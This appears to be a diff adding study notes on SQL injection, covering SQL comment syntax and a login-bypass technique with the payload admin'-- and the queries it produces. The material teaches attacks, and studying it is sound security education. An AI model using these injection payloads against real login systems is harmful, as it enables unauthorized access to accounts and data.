@@ -543,3 +543,50 @@ No direct output. The attacker infers data using:
 ### 3. **Out-of-Band SQL Injection**  
 The attacker sends data to a remote location (like a DNS server) and retrieves it from there.
 
+
+---
+
+# Using Comments in SQL
+- **Purpose**: Document queries or ignore parts of the query.
+- **Line Comments**:
+  - `-- ` (requires a space at the end)
+  - `# `
+
+### Examples
+```sql
+SELECT username FROM logins; -- Selects usernames from the logins table
+SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
+```
+
+### Tips
+- In URLs, spaces are encoded as `+` or `%20`.
+- Use `%23` to represent `#` in URLs.
+
+### Auth Bypass with Comments
+- **Injection Example**: `admin'--`
+- **Final Query**:
+  ```sql
+  SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+  ```
+- **Outcome**: Logs in as `admin` by bypassing additional conditions.
+
+### Using Parentheses in SQL
+- Ensures certain conditions are checked first.
+- **Example**: 
+  ```sql
+  SELECT * FROM logins WHERE (username='admin')-- )
+  ```
+
+### Steps to Bypass Login
+1. **Original Query**: 
+   ```sql
+   SELECT * FROM logins where (username='admin') AND password='hashed_value'
+   ```
+2. **Modified Query**: 
+   ```sql
+   SELECT * FROM logins where (username='admin')-- )
+   ```
+
+---
+
+
